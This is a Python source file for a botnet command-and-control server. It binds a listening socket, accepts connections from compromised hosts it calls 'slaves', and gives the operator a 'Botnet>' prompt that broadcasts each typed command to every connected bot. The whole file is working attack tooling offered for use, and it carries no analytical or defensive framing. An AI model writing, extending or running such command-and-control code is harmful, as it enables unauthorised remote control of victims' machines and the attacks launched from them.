import socket
import sys
import os
import threading
import queue
import time
from termcolor import colored
from colorama import init

USAGE_MSG = "[!] Usage:\n [+] python3 {arg} <LHOST> <LPORT>\n [+] Eg.: python3 {arg} 0.0.0.0 8080\n"

commands_q = queue.Queue()
socket_threads = []

def is_windows_platform():
    return os.name == 'nt'

if is_windows_platform():
    os.system('color')

class BotCmd(threading.Thread):
    def __init__(self, commands_q):
        threading.Thread.__init__(self)
        self.commands_q = commands_q

    def run(self):
        while True:
            cmd = str(input(colored("Botnet> ", "cyan")))
            if cmd == "":
                pass
            elif cmd == "exit":
                for i in range(len(socket_threads)):
                    time.sleep(0.1)
                    self.commands_q.put(cmd)
                time.sleep(5)
                os._exit(0)
            else:
                print(f"[+] Sending Command: '{cmd}' to {len(socket_threads)} bots")
                for i in range(len(socket_threads)):
                    time.sleep(0.1)
                    self.commands_q.put(cmd)


class BotHandler(threading.Thread):
    def __init__(self, client_sock, client_addr, commands_q):
        threading.Thread.__init__(self)
        self.client_sock = client_sock
        self.client_addr = client_addr
        self.ip = client_addr[0]
        self.port = client_addr[1]
        self.commands_q = commands_q

    def run(self):
        bot_name = threading.current_thread().getName()
        print(colored(f"[*] Slave {self.ip}:{self.port} connected with Thread-ID: {bot_name}", "red"))

        # client_list[bot_name] = self.client_addr
        while True:
            #recv_bot_cmd = self.commands_q.get()
            try:
                self.client_sock.send(str(self.commands_q.get()).encode('utf-8'))
                #recv_res = self.client_sock.recv(1024).decode('utf-8', 'ignore')
                #print(colored(f"[*] {bot_name} responded: {recv_res}", "green"))
            except Exception as e:
                print(e)
                break


def listener(lhost, lport, commands_q):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((lhost, lport))
    server.listen(100)

    print(f"[+] Starting Botnet listener on tcp://{lhost}:{lport}\n")

    bot_cmd_thread = BotCmd(commands_q)
    bot_cmd_thread.start()
    while True:
        (client_sock, client_addr) = server.accept()
        new_thread = BotHandler(client_sock, client_addr, commands_q)
        socket_threads.append(new_thread)
        new_thread.start()


def main():
    if len(sys.argv) < 3:
        print(USAGE_MSG.format(arg=sys.argv[0]))
        exit(1)

    try:
        lhost = sys.argv[1]
        lport = int(sys.argv[2])
        listener(lhost, lport, commands_q)
    except Exception as e:
        print("\n[-] Unable to run the handler. Reason: " + str(e) + "\n")


main()
